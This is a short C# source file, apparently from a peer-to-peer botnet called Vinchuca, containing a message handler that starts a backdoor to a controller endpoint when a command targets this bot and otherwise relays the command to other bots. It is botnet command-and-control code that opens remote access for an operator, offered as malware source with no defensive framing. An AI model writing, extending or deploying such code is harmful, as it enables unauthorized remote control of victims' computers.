using Vinchuca.Actions.Backdoor;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.Command;

namespace Vinchuca.Network.Protocol.Handlers.Command
{
    class BackdoorHandler : IMessageHandler
    {
        private readonly MessageManager _messageManager;
        public BackdoorHandler(MessageManager messageManager)
        {
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as BackdoorMessage;
            if (msg.TargetBotId.Equals(BotIdentifier.Id))
            {
                var controller = msg.ControllerEndpoint;
                var backdor = new Backdoor(controller);
                backdor.Run();
                return;
            }

            _messageManager.Broadcast(msg, botMessage.Header.Ttl--);
        }
    }
}
